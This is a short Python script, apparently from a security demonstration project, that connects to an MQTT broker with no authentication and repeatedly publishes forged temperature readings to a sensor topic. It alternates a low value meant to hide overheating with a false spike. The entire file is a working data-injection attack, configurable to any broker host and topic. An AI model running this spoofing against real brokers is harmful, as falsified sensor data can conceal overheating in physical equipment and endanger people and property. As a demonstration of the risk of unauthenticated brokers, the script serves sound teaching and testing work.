#!/usr/bin/env python3
# attacker/attacker.py
# Demonstrates injecting fake sensor data into the broker (no auth).

import paho.mqtt.client as mqtt
import time
import json
import argparse

parser = argparse.ArgumentParser(description="Attacker that injects fake data.")
parser.add_argument("--broker", default="localhost", help="MQTT broker host")
parser.add_argument("--topic", default="sensors/temperature1", help="Target topic")
parser.add_argument("--interval", type=float, default=2.0, help="Publish interval (s)")
args = parser.parse_args()

client = mqtt.Client(client_id="attacker_sim")
client.connect(args.broker, 1883, 60)

try:
    while True:
        # Attack pattern: send low temperature to hide overheating, then a spiked reading
        fake_low = {"device_id": "sensor_demo_1", "timestamp": int(time.time()), "temperature": 15.0}
        client.publish(args.topic, json.dumps(fake_low))
        print(f"[ATTACK] Sent fake low: {fake_low}")
        time.sleep(args.interval)

        fake_spike = {"device_id": "sensor_demo_1", "timestamp": int(time.time()), "temperature": 90.0}
        client.publish(args.topic, json.dumps(fake_spike))
        print(f"[ATTACK] Sent fake spike: {fake_spike}")
        time.sleep(args.interval)
except KeyboardInterrupt:
    print("Attacker stopped.")
    client.disconnect()
